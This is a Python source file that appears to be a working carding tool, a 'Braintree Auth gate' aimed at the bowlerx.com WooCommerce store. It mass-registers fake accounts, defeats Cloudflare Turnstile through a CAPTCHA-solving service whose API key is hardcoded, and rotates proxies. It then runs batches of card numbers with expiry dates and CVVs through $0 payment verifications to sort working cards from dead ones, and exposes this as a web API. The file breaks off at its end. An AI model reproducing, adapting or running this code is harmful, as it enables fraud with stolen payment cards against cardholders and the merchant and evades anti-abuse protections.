"""
new.py — BowlerX Braintree AUTH Gate ($0 verification)
High-performance, multi-threaded account pool & card checker for Render & Railway.

Site: https://www.bowlerx.com
Register: /my-account/ (Cloudflare Turnstile solved via CaptchaAI)
Billing Address: /my-account/edit-address/billing/
Add Payment Method: /my-account/add-payment-method/
Gateway: Braintree Auth ($0 verification) - Direct Account Pool Powered.
"""

import sys
import re
import json
import base64
import uuid
import random
import os
import time
import string
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests as rq
import requests as plain_requests

try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

try:
    from fastapi import FastAPI, Request, Response
    from fastapi.responses import JSONResponse
    app = FastAPI()
    def pretty_json(data, status_code=200):
        return Response(
            content=json.dumps(data, indent=2, ensure_ascii=False),
            media_type="application/json",
            status_code=status_code
        )
except Exception:
    app = None
    def pretty_json(data, status_code=200):
        return data

# ─── Configuration ───────────────────────────────────────────
GATEWAY = "Braintree Auth"
CREDIT = "@xoxhunterxd"
BASE = os.environ.get("BOWLERX_SITE", os.environ.get("BASE_URL", "https://www.bowlerx.com")).rstrip("/")
PM_URL = "/my-account/add-payment-method/"
GQL_URL = "https://payments.braintree-api.com/graphql"
IMP = os.environ.get("IMPERSONATE", "chrome120")
DEFAULT_PROXY = os.environ.get("PROXY", "")
COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.environ.get("COOKIE_FILE", "bowlerx_cookies.json"))
UA = os.environ.get(
    "USER_AGENT",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

# CaptchaAI Turnstile Configuration
CAPTCHAAI_KEY = os.environ.get("CAPTCHAAI_KEY", "r6skcjc4hvc5hwmrusrcwg8lczqt9med")
CF_SITEKEY = "0x4AAAAAAAOMqUubBeXy8JVc"
CAPTCHAAI_IN_URL = "https://ocr.captchaai.com/in.php"
CAPTCHAAI_RES_URL = "https://ocr.captchaai.com/res.php"

# Account Pool Constraints: Minimum 500 is default, Maximum 5000
MIN_POOL_SIZE = max(20, int(os.environ.get("MIN_POOL_SIZE", "500")))
MAX_POOL_SIZE = min(5000, max(20, int(os.environ.get("MAX_POOL_SIZE", "5000"))))
WORKER_THREADS = 5  # 5 concurrent threads for creation & batch checking

# Realistic US addresses for WooCommerce registration billing address (81801 vault fix)
US_ADDRESSES = [
    {"street": "123 Main St", "city": "New York", "state": "NY", "zip": "10001", "phone": "2125551234"},
    {"street": "742 Evergreen Ter", "city": "Springfield", "state": "IL", "zip": "62704", "phone": "2175550113"},
    {"street": "1600 Pennsylvania Ave NW", "city": "Washington", "state": "DC", "zip": "20500", "phone": "2024561111"},
    {"street": "100 Universal City Plz", "city": "Universal City", "state": "CA", "zip": "91608", "phone": "8185082000"},
    {"street": "200 E Colfax Ave", "city": "Denver", "state": "CO", "zip": "80203", "phone": "3038665000"},
    {"street": "350 5th Ave", "city": "New York", "state": "NY", "zip": "10118", "phone": "2127363100"},
    {"street": "600 Montgomery St", "city": "San Francisco", "state": "CA", "zip": "94111", "phone": "4159812000"},
    {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606", "phone": "3128750033"},
]

try:
    from faker import Faker
    _fk = Faker('en_US')
    def rand_name():
        return _fk.first_name(), _fk.last_name()
except Exception:
    _FN = ["James", "Sarah", "Michael", "Emma", "David", "Lisa", "Robert", "William", "Noah", "Ava"]
    _LN = ["Wilson", "Smith", "Brown", "Taylor", "Jones", "Miller", "Davis", "Garcia", "Johnson"]
    def rand_name():
        return random.choice(_FN), random.choice(_LN)

# ─── Global State & Locks ─────────────────────────────────────
_idx = 0
_lock = threading.Lock()
_building = 0
_req = 0
_done = 0
_fail = 0
_b_lock = threading.Lock()
_stop = threading.Event()
_auto_maintain_running = False
_auto_maintain_lock = threading.Lock()
_cookie_cooldowns = {}
COOKIE_COOLDOWN_SECONDS = 15

# ─── Utility Functions ────────────────────────────────────────

def rnd(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def luhn(cn):
    digits = [int(x) for x in str(cn) if x.isdigit()]
    if not digits:
        return False
    digits.reverse()
    return (sum(digits[0::2]) + sum(x - 9 if x > 9 else x for x in [i * 2 for i in digits[1::2]])) % 10 == 0

def brand(cc):
    cc_str = str(cc).strip()
    if re.match(r'^4', cc_str):
        return "visa"
    if re.match(r'^(5[1-5]|2[2-7])', cc_str):
        return "master-card"
    if re.match(r'^(34|37)', cc_str):
        return "amex"
    if re.match(r'^(6011|65)', cc_str):
        return "discover"
    return "visa"

def is_expired(mm, yy):
    try:
        month = int(mm)
        year = int(yy)
        if year < 100:
            year += 2000
        now = datetime.now()
        return year < now.year or (year == now.year and month < now.month)
    except Exception:
        return True

def sanitize(msg):
    if not msg:
        return ""
    msg = str(msg)
    msg = re.sub(r"https?://[^:\s]+:[^@\s]+@[^\s'\")\]]+", "", msg)
    msg = re.sub(r"([a-zA-Z0-9._-]+:[0-9]+:[a-zA-Z0-9._-]+:[a-zA-Z0-9._-]+)", "", msg)
    msg = re.sub(r"(HTTPS?|HTTP)ConnectionPool\([^)]+\):\s*", "", msg)
    msg = re.sub(r"Max retries.*", "Timeout", msg)
    msg = re.sub(r"https?://[^\s'\")\]]+", "", msg)
    msg = re.sub(r"bowlerx\.com", "", msg)
    msg = re.sub(r"learnmuscles\.com", "", msg)
    msg = re.sub(r"software\.owc\.com", "", msg)
    msg = re.sub(r"[a-zA-Z0-9._-]+\.braintreegateway\.com", "", msg)
    msg = re.sub(r"\s+", " ", msg)
    return msg.strip()

USE_PROXY = os.environ.get("USE_PROXY", "0").lower() in ("1", "true", "yes")

def format_proxy(proxy_str=None):
    if proxy_str and str(proxy_str).lower() in ("none", "direct", "0", "false"):
        return None
    raw = proxy_str or (DEFAULT_PROXY if USE_PROXY else None)
    if not raw and USE_PROXY:
        for pf in ["proxies.txt", "proxy.txt"]:
            pfp = os.path.join(os.path.dirname(os.path.abspath(__file__)), pf)
            if os.path.exists(pfp):
                try:
                    with open(pfp, "r", encoding="utf-8") as f:
                        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                        if lines:
                            raw = random.choice(lines)
                            break
                except Exception:
                    pass
    if not raw:
        return None
    proxies = [p.strip() for p in re.split(r'[,\s\n\r]+', str(raw)) if p.strip()]
    if not proxies:
        return None
    chosen = random.choice(proxies)
    if chosen.lower() in ("none", "direct"):
        return None
    if chosen.startswith(("http://", "https://", "socks5://")):
        return chosen
    parts = chosen.split(":")
    if len(parts) == 4:
        h, po, u, pw = parts
        return f"http://{u}:{pw}@{h}:{po}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{chosen}"

# ─── Cookie Pool Management ───────────────────────────────────

def load_pool():
    if os.path.exists(COOKIE_FILE):
        try:
            with open(COOKIE_FILE, "r", encoding="utf-8") as f:
                d = json.load(f)
                return d if isinstance(d, list) else []
        except Exception:
            return []
    return []

def save_pool(p):
    try:
        with open(COOKIE_FILE, "w", encoding="utf-8") as f:
            json.dump(p, f, indent=2)
    except Exception:
        pass

def get_cookie():
    p = load_pool()
    if not p:
        return None
    with _lock:
        now = time.time()
        # Find all accounts whose cooldown has expired
        eligible = [
            acc for acc in p
            if now - _cookie_cooldowns.get(acc.get("email"), 0) >= COOKIE_COOLDOWN_SECONDS
        ]
        if eligible:
            chosen = random.choice(eligible)
        else:
            # If all cookies are currently in cooldown, pick the one waiting the longest
            chosen = min(p, key=lambda acc: _cookie_cooldowns.get(acc.get("email"), 0))
            wait = COOKIE_COOLDOWN_SECONDS - (now - _cookie_cooldowns.get(chosen.get("email"), 0))
            if wait > 0:
                time.sleep(wait)

        _cookie_cooldowns[chosen.get("email")] = time.time()
        return chosen

def update_account_cookies(email, new_cookies):
    if not email:
        return
    with _lock:
        pool = load_pool()
        for acc in pool:
            if acc.get("email") == email:
                acc["cookies"] = new_cookies
                acc["updated_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
                break
        save_pool(pool)

def remove_cookie(em, proxy=None):
    with _lock:
        p = [e for e in load_pool() if e.get("email") != em]
        save_pool(p)
        _cookie_cooldowns.pop(em, None)
    # Background refill 1 account
    t = threading.Thread(target=create_accounts_bg, args=(1, proxy), daemon=True)
    t.start()

# ─── CaptchaAI Turnstile Solver ────────────────────────────────

def solve_turnstile_captchaai(page_url, sitekey=CF_SITEKEY, max_wait=90):
    """Solves Cloudflare Turnstile token using CaptchaAI API."""
    try:
        r = plain_requests.get(CAPTCHAAI_IN_URL, params={
            "key": CAPTCHAAI_KEY,
            "method": "turnstile",
            "sitekey": sitekey,
            "pageurl": page_url,
            "json": 1
        }, timeout=25)
        data = r.json()
        if data.get("status") != 1:
            return None
        task_id = data.get("request")

        start = time.time()
        while time.time() - start < max_wait:
            time.sleep(2.5)
            res = plain_requests.get(CAPTCHAAI_RES_URL, params={
                "key": CAPTCHAAI_KEY,
                "action": "get",
                "id": task_id,
                "json": 1
            }, timeout=20).json()

            if res.get("status") == 1:
                return res.get("request")
            elif "CAPCHA_NOT_READY" in str(res.get("request", "")):
                continue
            else:
                return None
        return None
    except Exception:
        return None

# ─── Background Session Verification (Only Remove If Session Expired) ───

def is_truly_session_expired(resp_text, resp_url, status_code=200):
    if not resp_text:
        return False

    text_lower = resp_text.lower()

    if "limited by the site owner" in text_lower or status_code == 503:
        return False
    if "checking your browser" in text_lower:
        return False
    if "so soon" in text_lower or "wait for" in text_lower:
        return False
    if "status code" in text_lower or "processor declined" in text_lower or "gateway rejected" in text_lower:
        return False

    if "session expired" in text_lower or "your session has expired" in text_lower:
        return True

    if "woocommerce-form-login" in text_lower or 'name="login"' in text_lower:
        if "add-payment-method" not in resp_url and ("/my-account" in resp_url or "login" in resp_url):
            return True

    return False

def verify_and_clean_cookie_bg(entry, proxy=None):
    em = entry.get("email")
    if not em:
        return

    time.sleep(random.uniform(2.0, 4.0))

    px = format_proxy(proxy)
    proxies = {"http": px, "https": px} if px else None
    s = rq.Session(impersonate=IMP, headers={"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"}, proxies=proxies)

    cookies = entry.get("cookies", {})
    for k, v in cookies.items():
        s.cookies.set(k, v)

    try:
        r = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"})
        h = r.text

        apn = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', h)
        ctn = re.search(r'"id":"braintree_credit_card"[^}]*client_token_nonce["\s:]+"([^"]+)"', h) or re.search(r'client_token_nonce["\s:]+"([^"]+)"', h)

        if apn and ctn:
            update_account_cookies(em, dict(s.cookies))
            return

        if is_truly_session_expired(h, r.url, r.status_code):
            remove_cookie(em, proxy=proxy)
    except Exception:
        pass

# ─── Randomized Identity & Account Creator ────────────────────

ADJECTIVES = [
    "swift", "bright", "silver", "golden", "silent", "calm", "rapid", "brave", "noble", "vivid",
    "frost", "shadow", "cosmic", "stellar", "amber", "mystic", "lunar", "solar", "wild", "prime",
    "echo", "iron", "storm", "blaze", "ocean", "river", "cedar", "alpine", "summit", "valiant"
]

NOUNS = [
    "falcon", "wolf", "hawk", "tiger", "eagle", "bear", "fox", "panther", "lynx", "otter",
    "badger", "phoenix", "sparrow", "raven", "jaguar", "runner", "rider", "pilot", "scout", "hunter",
    "stone", "peak", "canyon", "valley", "ridge", "harbor", "forest", "meadow", "brook", "glacier"
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com",
    "proton.me", "mail.com", "zoho.com", "aol.com", "yandex.com"
]

def generate_random_identity():
    fn, ln = rand_name()
    style = random.randint(1, 5)

    if style == 1:
        user = f"{random.choice(ADJECTIVES)}{random.choice(NOUNS)}{random.randint(10, 9999)}"
    elif style == 2:
        user = f"{fn[0].lower()}{ln.lower()}{random.randint(100, 99999)}"
    elif style == 3:
        user = f"{fn.lower()}{random.choice(NOUNS)}{random.randint(10, 999)}"
    elif style == 4:
        user = f"{ln.lower()}{fn[:2].lower()}{random.randint(10, 9999)}"
    else:
        prefix = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 7)))
        user = f"{prefix}{random.randint(100, 9999)}"

    user = re.sub(r'[^a-z0-9]', '', user.lower())
    if len(user) < 6:
        user = user + rnd(6 - len(user))

    domain = random.choice(EMAIL_DOMAINS)
    email_style = random.randint(1, 4)
    if email_style == 1:
        mail = f"{user}@{domain}"
    elif email_style == 2:
        mail = f"{fn.lower()}.{ln.lower()}{random.randint(10, 99999)}@{domain}"
    elif email_style == 3:
        mail = f"{ln.lower()}{fn.lower()[:3]}{random.randint(100, 9999)}@{domain}"
    else:
        mail = f"{fn.lower()}{rnd(random.randint(3, 5))}{random.randint(10, 999)}@{domain}"

    mail = mail.lower()
    return fn, ln, user, mail

def create_account(proxy=None):
    """
    Creates an account directly on BowlerX via /my-account/.
    Solves Cloudflare Turnstile using CaptchaAI.
    Saves billing address for Braintree vault.
    """
    for attempt in range(3):
        px = format_proxy(proxy)
        proxies = {"http": px, "https": px} if px else None

        fn, ln, user, mail = generate_random_identity()

        addr_info = random.choice(US_ADDRESSES)
        street_parts = addr_info['street'].split(' ', 1)
        addr = f"{random.randint(100, 9999)} {street_parts[-1]}" if len(street_parts) > 1 else addr_info['street']
        city = addr_info['city']
        state = addr_info.get('state', 'NY')
        pc = addr_info.get('zip', '10001')
        ph = addr_info.get('phone', f"555{random.randint(1000000, 9999999)}")

        s = rq.Session(impersonate=IMP, headers={"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"}, proxies=proxies)

        try:
            # Step 1: Grab registration nonce from /my-account/
            h = s.get(BASE + "/my-account/", timeout=15).text
            rn = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', h)
            if not rn:
                time.sleep(1.0)
                continue

            # Step 2: Solve Cloudflare Turnstile token via CaptchaAI
            cf_token = solve_turnstile_captchaai(BASE + "/my-account/")
            if not cf_token:
                time.sleep(1.0)
                continue

            # Step 3: Submit Registration
            rp = s.post(
                BASE + "/my-account/",
                data={
                    "email": mail,
                    "cf-turnstile-response": cf_token,
                    "mailchimp_woocommerce_newsletter": "1",
                    "woocommerce-register-nonce": rn.group(1),
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                },
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": BASE,
                    "Referer": BASE + "/my-account/"
                },
                timeout=40,
                allow_redirects=True
            )

            is_success = any("wordpress_logged_in" in k for k in s.cookies.keys())

            if not is_success:
                time.sleep(1.0)
                continue

            # Step 4: Save Billing Address (Required for Braintree vault)
            be = s.get(BASE + "/my-account/edit-address/billing/", timeout=30).text
            bn = re.search(r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"', be)
            if bn:
                s.post(
                    BASE + "/my-account/edit-address/billing/",
                    data={
                        "billing_first_name": fn,
                        "billing_last_name": ln,
                        "billing_company": "",
                        "billing_country": "US",
                        "billing_address_1": addr,
                        "billing_address_2": "",
                        "billing_city": city,
                        "billing_state": state,
                        "billing_postcode": pc,
                        "billing_phone": ph,
                        "billing_email": mail,
                        "save_address": "Save address",
                        "woocommerce-edit-address-nonce": bn.group(1),
                        "_wp_http_referer": "/my-account/edit-address/billing/",
                        "action": "edit_address"
                    },
                    headers={
                        "Referer": BASE + "/my-account/edit-address/billing/",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": BASE
                    },
                    timeout=40,
                    allow_redirects=True
                )

            ck = dict(s.cookies)
            entry = {
                "email": mail,
                "user": user,
                "cookies": ck,
                "bill": {
                    "fn": fn,
                    "ln": ln,
                    "addr": addr,
                    "city": city,
                    "state": state,
                    "pc": pc,
                    "ph": ph
                },
                "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
            }

            with _lock:
                pool = load_pool()
                pool.append(entry)
                if len(pool) > MAX_POOL_SIZE:
                    pool = pool[-MAX_POOL_SIZE:]
                save_pool(pool)

            return {"email": mail, "status": "success", "user": user, "cookies": ck, "bill": entry["bill"]}

        except Exception:
            time.sleep(1.0)
            continue

    return {"email": "fail", "status": "fail"}

# ─── Multi-Threaded Background Account Creator ────────────────

def create_accounts_bg(count, proxy=None):
    global _building, _req, _done, _fail
    _stop.clear()

    with _b_lock:
        _building += count
        _req += count

    def _worker():
        global _building, _done, _fail
        if _stop.is_set():
            with _b_lock:
                _building -= 1
                _fail += 1
            return
        px = format_proxy(proxy)
        r = create_account(proxy=proxy)
        with _b_lock:
            _building -= 1
            if r.get("status") == "success":
                _done += 1
            else:
                _fail += 1

    with ThreadPoolExecutor(max_workers=WORKER_THREADS) as executor:
        futures = [executor.submit(_worker) for _ in range(count)]
        for f in as_completed(futures):
            if _stop.is_set():
                break

def auto_maintain_pool(proxy=None):
    """Background thread ensuring pool stays at minimum MIN_POOL_SIZE accounts."""
    global _auto_maintain_running
    with _auto_maintain_lock:
        if _auto_maintain_running:
            return
        _auto_maintain_running = True

    def _worker():
        global _auto_maintain_running
        try:
            while True:
                time.sleep(30)
                pool = load_pool()
                with _b_lock:
                    currently_building = _building

                needed = MIN_POOL_SIZE - (len(pool) + currently_building)
                if needed > 0 and not _stop.is_set():
                    batch_needed = max(10, needed)
                    create_accounts_bg(batch_needed, proxy=proxy)
        except Exception:
            pass
        finally:
            with _auto_maintain_lock:
                _auto_maintain_running = False

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

# ─── Card Checker ($0 Auth) ───────────────────────────────────

def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
    t0 = time.time()
    card_str = f"{cc}|{mm}|{yy}|{cvv}"

    def result(msg):
        return {
            "card": card_str,
            "gateway": GATEWAY,
            "response": sanitize(msg),
            "time": f"{time.time() - t0:.1f}s",
            "credit": CREDIT
        }

    if not luhn(cc):
        return result("Card is Incorrect")
    if is_expired(mm, yy):
        return result("Expired Card")
    cvv_c = str(cvv).strip()
    if len(cvv_c) not in (3, 4):
        return result("Invalid CVV")

    pool = load_pool()
    if not pool:
        threading.Thread(target=create_accounts_bg, args=(MIN_POOL_SIZE, proxy), daemon=True).start()
        fresh = create_account(proxy=proxy)
        if fresh.get("status") == "success":
            entry = fresh
            with _lock:
                _cookie_cooldowns[fresh.get("email")] = time.time()
        else:
            return result("Try Again Later")
    else:
        entry = get_cookie()
        if not entry:
            return result("Try Again Later")

    px = format_proxy(proxy)
    proxies = {"http": px, "https": px} if px else None
    s = rq.Session(impersonate=IMP, headers={"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"}, proxies=proxies)

    cookies = entry.get("cookies", {})
    for k, v in cookies.items():
        s.cookies.set(k, v)

    try:
        # 1. Fetch add-payment-method page
        h = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"}).text

        apn = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', h)
        ctn = None
        m = re.search(r'"id":"braintree_credit_card"[^}]*client_token_nonce["\s:]+"([^"]+)"', h)
        if m:
            ctn = m.group(1)
        else:
            m2 = re.search(r'client_token_nonce["\s:]+"([^"]+)"', h)
            if m2:
                ctn = m2.group(1)

        # Nonce missing: do not remove cookie immediately!
        if not apn or not ctn:
            threading.Thread(target=verify_and_clean_cookie_bg, args=(entry, proxy), daemon=True).start()

            if retries > 0:
                if len(load_pool()) > 1:
                    return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
                fresh = create_account(proxy=proxy)
                if fresh.get("status") == "success":
                    return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
            
            if "login" in h.lower() or "woocommerce-form-login" in h.lower():
                return result("Session Expired")
            return result("Gateway Nonce Missing")

        # 2. Fetch Braintree Client Token
        rt = s.post(
            BASE + "/wp-admin/admin-ajax.php",
            data={
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": ctn
            },
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": BASE,
                "Referer": BASE + PM_URL
            },
            timeout=30
        )
        try:
            res_json = rt.json()
            if not res_json.get("success"):
                err_data = str(res_json.get("data", ""))
                return result(f"Braintree Token Error: {err_data}" if err_data else "Failed to fetch client token")
            dec = json.loads(base64.b64decode(res_json["data"]).decode("utf-8", errors="ignore"))
            fp = dec["authorizationFingerprint"]
        except Exception as e:
            return result(f"Client Token Error: {sanitize(str(e))}")

        # 3. Tokenize card via Braintree GraphQL
        yf = "20" + yy if len(yy) == 2 else yy
        fn, ln = rand_name()
        b = entry.get("bill", {})

        p = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": uuid.uuid4().hex},
            "query": "mutation T($i:TokenizeCreditCardInput!){tokenizeCreditCard(input:$i){token}}",
            "variables": {
                "i": {
                    "creditCard": {
                        "number": str(cc).strip(),
                        "expirationMonth": str(mm).strip(),
                        "expirationYear": yf,
                        "cvv": cvv_c,
                        "cardholderName": f"{fn} {ln}",
                        "billingAddress": {
                            "streetAddress": b.get("addr", "123 Main St"),
                            "locality": b.get("city", "New York"),
                            "region": b.get("state", "NY"),
                            "postalCode": b.get("pc", "10001"),
                            "countryCodeAlpha2": "US"
                        }
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "T"
        }

        td = rq.post(
            GQL_URL,
            json=p,
            impersonate=IMP,
            proxies=proxies,
            timeout=35,
            headers={
                "Authorization": "Bearer " + fp,
                "Braintree-Version": "2021-10-01",
                "Content-Type": "application/json",
                "Origin": "https://assets.braintreegateway.com",
                "Referer": "https://assets.braintreegateway.com/"
            }
        ).json()

        ni = (td.get("data") or {}).get("tokenizeCreditCard")
        if not ni:
            gql_errors = td.get("errors") or []
            if gql_errors and isinstance(gql_errors, list):
                msgs = [e.get("message") for e in gql_errors if e.get("message")]
                if msgs:
                    return result(f"Braintree: {' | '.join(msgs)}")
            return result("Card Tokenization Failed")

        # 4. Submit Add Payment Method ($0 Auth)
        dd = json.dumps({
            "device_session_id": uuid.uuid4().hex,
            "fraud_merchant_id": "600000",
            "correlation_id": uuid.uuid4().hex
        })

        r = s.post(
            BASE + PM_URL,
            data={
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": brand(cc),
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": ni["token"],
                "wc_braintree_device_data": dd,
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "billing_first_name": b.get("fn", fn),
                "billing_last_name": b.get("ln", ln),
                "billing_company": "",
                "billing_country": "US",
                "billing_address_1": b.get("addr", "123 Main St"),
                "billing_address_2": "",
                "billing_city": b.get("city", "New York"),
                "billing_state": b.get("state", "NY"),
                "billing_postcode": b.get("pc", "10001"),
                "billing_phone": b.get("ph", "2125551234"),
                "billing_email": entry.get("email", ""),
                "woocommerce-add-payment-method-nonce": apn.group(1),
                "_wp_http_referer": PM_URL,
                "woocommerce_add_payment_method": "1"
            },
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": BASE,
                "Referer": BASE + PM_URL
            },
            timeout=60,
            allow_redirects=True
        )

        # 5. Refresh saved cookies & parse response
        update_account_cookies(entry.get("email"), dict(s.cookies))

        if "payment-methods" in r.url and "add" not in r.url:
            return result("APPROVED - Payment Method Added")

        msg_ok = re.findall(r'class="woocommerce-message"[^>]*>(.*?)</(?:ul|div|li)', r.text, re.S)
        if msg_ok:
            clean_m = re.sub(r'<[^>]+>', ' ', msg_ok[0])
            clean_m = re.sub(r'\s+', ' ', clean_m).strip()
            if any(w in clean_m.lower() for w in ["success", "added", "approved"]):
                return result(f"APPROVED - {clean_m}")

        # Check for Braintree processor response / status code (Full exact response)
        m_status = re.search(r'(Status code\s*[^<]+)', r.text, re.I)
        if m_status:
            clean_stat = re.sub(r'<[^>]+>', ' ', m_status.group(1))
            return result(re.sub(r'\s+', ' ', clean_stat).strip())

        found = []
        for m_err in re.finditer(r'<ul class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</ul>', r.text, re.S):
            lis = re.findall(r'<li>(.*?)</li>', m_err.group(1), re.S)
            if lis:
                for li in lis:
                    c = re.sub(r'<[^>]+>', ' ', li).strip()
                    c = re.sub(r'\s+', ' ', c)
                    if c and c not in found:
                        found.append(c)
            else:
                c = re.sub(r'<[^>]+>', ' ', m_err.group(1)).strip()
                c = re.sub(r'\s+', ' ', c)
                if c and c not in found:
                    found.append(c)

        err_text = " | ".join(found).strip()

        # Check if cookie rate limited / cooldown ("so soon after the previous one")
        if "so soon" in err_text.lower() or "wait for" in err_text.lower():
            if retries > 0 and len(load_pool()) > 1:
                return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)

        # Return real error if found!
        if err_text:
            return result(err_text)

        # Check if response text has any WooCommerce notice / error
        m_notice = re.search(r'class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</', r.text, re.S)
        if m_notice:
            clean_n = sanitize(re.sub(r'<[^>]+>', ' ', m_notice.group(1)))
            if clean_n:
                return result(clean_n)

        if r.status_code != 200:
            return result(f"HTTP {r.status_code} Error")

        return result("Card Declined")

    except Exception as e:
        err_str = sanitize(str(e))
        if not err_str or "connection" in err_str.lower() or "timeout" in err_str.lower():
            err_str = "Network / Proxy Timeout"
        return result(f"Error: {err_str}")

# ─── Card Parsing & Batch Workers (10 Threads) ────────────────

def parse_cards(raw):
    cards = []
    for m in re.finditer(r'((?:34|37)\d{13}[|:]\d{1,2}[|:]\d{2,4}[|:]\d{4})|(\d{13,19}[|:]\d{1,2}[|:]\d{2,4}[|:]\d{3})', raw):
        c = m.group(1) or m.group(2)
        if c and c not in cards:
            cards.append(c)
        if len(cards) >= 30:
            break
    if cards:
        return cards[:30]
    for p in re.split(r'[\s,\n]+', raw):
        sp = re.split(r'[|:]', p.strip())
        if len(sp) >= 4 and all(x.isdigit() for x in sp[:4]):
            c = f"{sp[0]}|{sp[1]}|{sp[2]}|{sp[3]}"
            if c not in cards:
                cards.append(c)
        if len(cards) >= 30:
            break
    return cards[:30]

def process_single(card, proxy=None):
    parts = re.split(r'[|:]', card.strip())
    if len(parts) >= 4:
        time.sleep(random.uniform(0.1, 0.4))
        return check_card(parts[0], parts[1], parts[2], parts[3], proxy=proxy)
    return {
        "card": card,
        "gateway": GATEWAY,
        "response": "Invalid format",
        "time": "0.0s",
        "credit": CREDIT
    }

# ─── FastAPI Endpoints ────────────────────────────────────────

if app:
    @app.get("/")
    def root():
        return pretty_json({
            "status": "ok",
            "gateway": GATEWAY,
            "type": "auth($0)",
            "site": "bowlerx",
            "pool": len(load_pool()),
            "credit": CREDIT
        })

    @app.get("/b3")
    def b3(cc: str = None, acc: str = None, p: str = None):
        if acc is not None:
            s_acc = str(acc).strip().lower()
            if s_acc in ("0", "status", "info"):
                with _b_lock:
                    b, r, d, f = _building, _req, _done, _fail
                pool = load_pool()
                return pretty_json({
                    "pool_size": len(pool),
                    "building": b,
                    "requested": r,
                    "done": d,
                    "failed": f,
                    "accounts": [{"email": a.get("email", "?"), "user": a.get("user", "?"), "created": a.get("created_at", "?")} for a in pool],
                    "credit": CREDIT
                })

            # Minimum 20 is compulsory, Maximum 5000
            try:
                raw_n = int(acc)
            except Exception:
                raw_n = 20

            if raw_n < 20:
                n = 20
            elif raw_n > 5000:
                n = 5000
            else:
                n = raw_n

            threading.Thread(target=create_accounts_bg, args=(n, p), daemon=True).start()
            return pretty_json({
                "status": "creating",
                "count": n,
                "current_pool": len(load_pool()),
                "message": f"Building {n} accounts in background. /b3?acc=0 for status"
            })

        if not cc:
            return pretty_json({"error": "Missing cc or acc"}, status_code=400)
        parts = re.split(r'[|:]', cc)
        if len(parts) >= 4:
            return pretty_json(check_card(parts[0], parts[1], parts[2], parts[3], proxy=p))
        return pretty_json({"error": "Format: cc|mm|yy|cvv"}, status_code=400)

    @app.api_route("/batch", methods=["GET", "POST"])
    async def batch(request: Request = None, cc: str = None, c: str = None, p: str = None):
        raw = cc or c
        if not raw and request:
            try:
                body = await request.body()
                if body:
                    raw = body.decode("utf-8", errors="ignore")
            except Exception:
                pass
        if not raw:
            return pretty_json({"error": "Missing cc or c parameter"}, status_code=400)
        cards = parse_cards(raw)
        if not cards:
            return pretty_json({"error": "No valid cards found in format cc|mm|yy|cvv"}, status_code=400)

        t0 = time.time()
        results = []
        with ThreadPoolExecutor(max_workers=WORKER_THREADS) as ex:
            futs = {ex.submit(process_single, card, p): card for card in cards}
            for f in as_completed(futs):
                try:
                    results.append(f.result())
                except Exception as e:
                    results.append({
                        "card": futs[f],
                        "gateway": GATEWAY,
                        "response": sanitize(str(e)) or "Request Failed",
                        "time": "0.0s",
                        "credit": CREDIT
                    })

        approved = sum(1 for r in results if "APPROVED" in r.get("response", "").upper())
        declined = sum(1 for r in results if "APPROVED" not in r.get("response", "").upper())

        return pretty_json({
            "status": "ok",
            "gateway": GATEWAY,
            "total_cards": len(results),
            "approved": approved,
            "declined": declined,
            "total_time": f"{time.time() - t0:.1f}s",
            "results": results,
            "credit": CREDIT
        })

    @app.get("/stop")
    def stop():
        _stop.set()
        with _b_lock:
            building = _building
        return pretty_json({"status": "stopped", "building": building})

# ─── Main / CLI Execution ─────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and ("|" in sys.argv[1] or ":" in sys.argv[1]):
        p_arg = sys.argv[2] if len(sys.argv) > 2 else None
        parts = re.split(r'[|:]', sys.argv[1])
        if len(parts) >= 4:
            res = check_card(parts[0], parts[1], parts[2], parts[3], proxy=p_arg)
            print(json.dumps(res, indent=2, ensure_ascii=False))
            sys.exit(0)

    try:
        import uvicorn
    except ImportError:
